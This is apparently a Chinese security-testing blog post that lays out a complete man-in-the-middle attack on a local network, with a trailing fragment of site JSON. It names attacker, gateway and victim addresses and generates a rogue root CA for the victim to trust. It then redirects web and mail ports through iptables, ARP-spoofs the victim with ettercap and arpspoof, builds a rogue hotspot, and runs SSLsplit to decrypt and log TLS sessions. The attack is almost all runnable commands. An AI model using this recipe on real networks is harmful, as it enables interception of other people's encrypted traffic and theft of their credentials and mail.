攻击者ip:192.168.31.200 操作主机 网关：192.168.31.1 路由器 受害者：192.168.31.224 手机或电脑 开启ip转发 echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward 生成CA证书 12openssl genrsa -out ca.key 4096openssl req -new -x509 -days 1826 -key ca.key -out ca.crt 第1个命令，生成 4096位的RSA私钥（以pem格式保存) ca.key 第2个命令， 使用这个刚生成的私钥，来生成一个 自签名的 root CA 证书(ca.crt) 这两个文件在后面都会用到。只有ca.crt这个证书文件，需要安装 到浏览器，或者受害者的机器上。 端口流量转发 用iptables进行流量转发，需要把我们需要的端口进行转发 8080用作非SSL的TCP连接，比如 http, smtp, ftp8443 用作SSL的连接，比如SMTP over SSL, HTTPS等 12345678sysctl -w net.ipv4.ip_forward=1iptables -t nat -Fiptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443 ARP欺骗 ettercap -T -q -M ARP //192.168.31.224/ //192.168.31.1/ arpspoof -i eth0 -t 192.168.31.1 192.168.31.224 直接建立热点 kali下可以直接建立热点，需要打开iptables的nat功能123iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE #对eth0进行源natiptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT #把无线网卡流量转发到有线网卡（或者什么能上网的网卡）上面iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356 #修改最大报文段长度 使用SSLsplit进行 sslsplit -D -l connect.log -j /opt/sslsplit/test1 -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 使用starttls-mitm进行(https://github.com/adrain09/starttls-mitm)","tags":[{"name":"安全测试","slug":"安全测试","permalink":"https://adrain09.github.io/tags/安全测试/"}]}]